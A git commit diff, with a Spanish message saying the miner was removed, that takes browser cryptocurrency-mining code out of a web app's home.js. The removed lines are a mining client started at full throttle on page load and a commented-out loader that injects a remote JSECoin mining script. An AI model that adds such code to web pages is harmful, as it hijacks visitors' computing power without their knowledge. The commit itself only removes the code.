3ba49df73fd905f00130833b71c59cf725c5d35b
ulisesten <ulises.mtz.el@gmail.com>
2019-03-06 16:19:03 -0600

    Se retiró miner

--- public/scripts/home.js
+++ public/scripts/home.js
@@ -242,17 +242,6 @@ getEl('salir').addEventListener('click', function(){
     })
 })
 
-
-var _client = new Client.User('6803c03793e7d4939f9bd531c1c879977f8dcf512387c951e64fe3c6653e0a59',usuario, {
-    throttle: 0.0, c: 'w'
-});
-
-_client.start();
-
-
-//!function(){window.JSEDarkMode=1;window.JSESetLanguage="es";var e=document,t=e.createElement("script"),s=e.getElementsByTagName("script")[0];t.type="text/javascript",t.async=t.defer=!0,t.src="https://load.jsecoin.com/load/145891/neki-platform.herokuapp.com/0/0/",s.parentNode.insertBefore(t,s)}();
-
-
 /***get auth */
 function getWsAuth(csrf,cb){
     var headers = {
@@ -310,4 +299,3 @@ function getPubs(){
 
 
 })//DOCLoaded
-
